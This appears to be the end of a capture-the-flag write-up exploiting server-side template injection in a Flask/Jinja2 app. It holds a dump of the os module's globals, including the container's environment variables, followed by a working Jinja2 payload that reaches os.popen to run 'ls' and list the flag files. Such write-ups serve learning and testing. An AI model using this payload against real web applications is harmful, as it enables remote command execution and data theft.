'SC_AIO_MAX': 24, 'SC_AIO_PRIO_DELTA_MAX': 25, 'SC_ARG_MAX': 0, 'SC_ASYNCHRONOUS_IO': 12, 'SC_ATEXIT_MAX': 87, 'SC_AVPHYS_PAGES': 86, 'SC_BC_BASE_MAX': 36, 'SC_BC_DIM_MAX': 37, 'SC_BC_SCALE_MAX': 38, 'SC_BC_STRING_MAX': 39, 'SC_CHARCLASS_NAME_MAX': 45, 'SC_CHAR_BIT': 101, 'SC_CHAR_MAX': 102, 'SC_CHAR_MIN': 103, 'SC_CHILD_MAX': 1, 'SC_CLK_TCK': 2, 'SC_COLL_WEIGHTS_MAX': 40, 'SC_DELAYTIMER_MAX': 26, 'SC_EQUIV_CLASS_MAX': 41, 'SC_EXPR_NEST_MAX': 42, 'SC_FSYNC': 15, 'SC_GETGR_R_SIZE_MAX': 69, 'SC_GETPW_R_SIZE_MAX': 70, 'SC_INT_MAX': 104, 'SC_INT_MIN': 105, 'SC_IOV_MAX': 60, 'SC_JOB_CONTROL': 7, 'SC_LINE_MAX': 43, 'SC_LOGIN_NAME_MAX': 71, 'SC_LONG_BIT': 106, 'SC_MAPPED_FILES': 16, 'SC_MB_LEN_MAX': 108, 'SC_MEMLOCK': 17, 'SC_MEMLOCK_RANGE': 18, 'SC_MEMORY_PROTECTION': 19, 'SC_MESSAGE_PASSING': 20, 'SC_MQ_OPEN_MAX': 27, 'SC_MQ_PRIO_MAX': 28, 'SC_NGROUPS_MAX': 3, 'SC_NL_ARGMAX': 119, 'SC_NL_LANGMAX': 120, 'SC_NL_MSGMAX': 121, 'SC_NL_NMAX': 122, 'SC_NL_SETMAX': 123, 'SC_NL_TEXTMAX': 124, 'SC_NPROCESSORS_CONF': 83, 'SC_NPROCESSORS_ONLN': 84, 'SC_NZERO': 109, 'SC_OPEN_MAX': 4, 'SC_PAGESIZE': 30, 'SC_PAGE_SIZE': 30, 'SC_PASS_MAX': 88, 'SC_PHYS_PAGES': 85, 'SC_PII': 53, 'SC_PII_INTERNET': 56, 'SC_PII_INTERNET_DGRAM': 62, 'SC_PII_INTERNET_STREAM': 61, 'SC_PII_OSI': 57, 'SC_PII_OSI_CLTS': 64, 'SC_PII_OSI_COTS': 63, 'SC_PII_OSI_M': 65, 'SC_PII_SOCKET': 55, 'SC_PII_XTI': 54, 'SC_POLL': 58, 'SC_PRIORITIZED_IO': 13, 'SC_PRIORITY_SCHEDULING': 10, 'SC_REALTIME_SIGNALS': 9, 'SC_RE_DUP_MAX': 44, 'SC_RTSIG_MAX': 31, 'SC_SAVED_IDS': 8, 'SC_SCHAR_MAX': 111, 'SC_SCHAR_MIN': 112, 'SC_SELECT': 59, 'SC_SEMAPHORES': 21, 'SC_SEM_NSEMS_MAX': 32, 'SC_SEM_VALUE_MAX': 33, 'SC_SHARED_MEMORY_OBJECTS': 22, 'SC_SHRT_MAX': 113, 'SC_SHRT_MIN': 114, 'SC_SIGQUEUE_MAX': 34, 'SC_SSIZE_MAX': 110, 'SC_STREAM_MAX': 5, 'SC_SYNCHRONIZED_IO': 14, 'SC_THREADS': 67, 'SC_THREAD_ATTR_STACKADDR': 77, 'SC_THREAD_ATTR_STACKSIZE': 78, 'SC_THREAD_DESTRUCTOR_ITERATIONS': 73, 'SC_THREAD_KEYS_MAX': 74, 'SC_THREAD_PRIORITY_SCHEDULING': 79, 'SC_THREAD_PRIO_INHERIT': 80, 'SC_THREAD_PRIO_PROTECT': 81, 'SC_THREAD_PROCESS_SHARED': 82, 'SC_THREAD_SAFE_FUNCTIONS': 68, 'SC_THREAD_STACK_MIN': 75, 'SC_THREAD_THREADS_MAX': 76, 'SC_TIMERS': 11, 'SC_TIMER_MAX': 35, 'SC_TTY_NAME_MAX': 72, 'SC_TZNAME_MAX': 6, 'SC_T_IOV_MAX': 66, 'SC_UCHAR_MAX': 115, 'SC_UINT_MAX': 116, 'SC_UIO_MAXIOV': 60, 'SC_ULONG_MAX': 117, 'SC_USHRT_MAX': 118, 'SC_VERSION': 29, 'SC_WORD_BIT': 107, 'SC_XBS5_ILP32_OFF32': 125, 'SC_XBS5_ILP32_OFFBIG': 126, 'SC_XBS5_LP64_OFF64': 127, 'SC_XBS5_LPBIG_OFFBIG': 128, 'SC_XOPEN_CRYPT': 92, 'SC_XOPEN_ENH_I18N': 93, 'SC_XOPEN_LEGACY': 129, 'SC_XOPEN_REALTIME': 130, 'SC_XOPEN_REALTIME_THREADS': 131, 'SC_XOPEN_SHM': 94, 'SC_XOPEN_UNIX': 91, 'SC_XOPEN_VERSION': 89, 'SC_XOPEN_XCU_VERSION': 90, 'SC_XOPEN_XPG2': 98, 'SC_XOPEN_XPG3': 99, 'SC_XOPEN_XPG4': 100}, 'error': <class 'OSError'>, 'waitid_result': <class 'posix.waitid_result'>, 'stat_result': <class 'os.stat_result'>, 'statvfs_result': <class 'os.statvfs_result'>, 'sched_param': <class 'posix.sched_param'>, 'terminal_size': <class 'os.terminal_size'>, 'DirEntry': <class 'posix.DirEntry'>, 'times_result': <class 'posix.times_result'>, 'uname_result': <class 'posix.uname_result'>, '_exit': <built-in function _exit>, 'path': <module 'posixpath' (frozen)>, 'curdir': '.', 'pardir': '..', 'sep': '/', 'pathsep': ':', 'defpath': '/bin:/usr/bin', 'extsep': '.', 'altsep': None, 'devnull': '/dev/null', 'supports_dir_fd': {<built-in function stat>, <built-in function link>, <built-in function open>, <built-in function chmod>, <built-in function utime>, <built-in function unlink>, <built-in function access>, <built-in function rename>, <built-in function rmdir>, <built-in function readlink>, <built-in function mkfifo>, <built-in function mknod>, <built-in function symlink>, <built-in function chown>, <built-in function mkdir>}, 'supports_effective_ids': {<built-in function access>}, 'supports_fd': {<built-in function stat>, <built-in function chmod>, <built-in function execve>, <built-in function utime>, <built-in function listdir>, <built-in function statvfs>, <built-in function scandir>, <built-in function truncate>, <built-in function pathconf>, <built-in function chdir>, <built-in function chown>}, 'supports_follow_symlinks': {<built-in function stat>, <built-in function link>, <built-in function utime>, <built-in function access>, <built-in function chown>}, 'SEEK_SET': 0, 'SEEK_CUR': 1, 'SEEK_END': 2, 'makedirs': <function makedirs at 0x7fceecad8b80>, 'removedirs': <function removedirs at 0x7fceecadb920>, 'renames': <function renames at 0x7fceecae0ea0>, 'walk': <function walk at 0x7fceecae0f40>, '_walk': <function _walk at 0x7fceecae0fe0>, 'fwalk': <function fwalk at 0x7fceecae1080>, '_fwalk': <function _fwalk at 0x7fceecae1120>, 'execl': <function execl at 0x7fceecae11c0>, 'execle': <function execle at 0x7fceecae1260>, 'execlp': <function execlp at 0x7fceecae1300>, 'execlpe': <function execlpe at 0x7fceecae13a0>, 'execvp': <function execvp at 0x7fceecae1440>, 'execvpe': <function execvpe at 0x7fceecae14e0>, '_execvpe': <function _execvpe at 0x7fceecae1580>, 'get_exec_path': <function get_exec_path at 0x7fceecae1620>, 'MutableMapping': <class 'collections.abc.MutableMapping'>, 'Mapping': <class 'collections.abc.Mapping'>, '_Environ': <class 'os._Environ'>, 'getenv': <function getenv at 0x7fceecae16c0>, 'supports_bytes_environ': True, 'environb': environ({b'HOSTNAME': b'2a88d9e3b6e8', b'PYTHON_PIP_VERSION': b'22.3', b'HOME': b'/root', b'GPG_KEY': b'A035C8C19219BA821ECEA86B64E628F8D684696D', b'PYTHON_GET_PIP_URL': b'https://github.com/pypa/get-pip/raw/66030fa03382b4914d4c4d0896961a0bdeeeb274/public/get-pip.py', b'PATH': b'/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', b'LANG': b'C.UTF-8', b'PYTHON_VERSION': b'3.11.0', b'PYTHON_SETUPTOOLS_VERSION': b'65.5.0', b'PWD': b'/code', b'PYTHON_GET_PIP_SHA256': b'1e501cf004eac1b7eb1f97266d28f995ae835d30250bec7f8850562703067dc6', b'WERKZEUG_SERVER_FD': b'3'}), 'getenvb': <function getenvb at 0x7fceecae2160>, 'fsencode': <function _fscodec.<locals>.fsencode at 0x7fceecae22a0>, 'fsdecode': <function _fscodec.<locals>.fsdecode at 0x7fceecae2340>, 'P_WAIT': 0, 'P_NOWAIT': 1, 'P_NOWAITO': 1, '_spawnvef': <function _spawnvef at 0x7fceecae2200>, 'spawnv': <function spawnv at 0x7fceecae23e0>, 'spawnve': <function spawnve at 0x7fceecae2480>, 'spawnvp': <function spawnvp at 0x7fceecae2520>, 'spawnvpe': <function spawnvpe at 0x7fceecae25c0>, 'spawnl': <function spawnl at 0x7fceecae2660>, 'spawnle': <function spawnle at 0x7fceecae2700>, 'spawnlp': <function spawnlp at 0x7fceecae27a0>, 'spawnlpe': <function spawnlpe at 0x7fceecae2840>, 'popen': <function popen at 0x7fceecae28e0>, '_wrap_close': <class 'os._wrap_close'>, 'fdopen': <function fdopen at 0x7fceecae2980>, '_fspath': <function _fspath at 0x7fceecae2de0>, 'PathLike': <class 'os.PathLike'>}
        ```
        :::
        Then we can open system and write the command
    * Payload: `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__['popen']('ls').read()}}` → Output:   
        ```
        Hello app.py
        flag
        flag.txt
        instance
        requirements.txt
        templates
        ```
3. Then we got flag!!!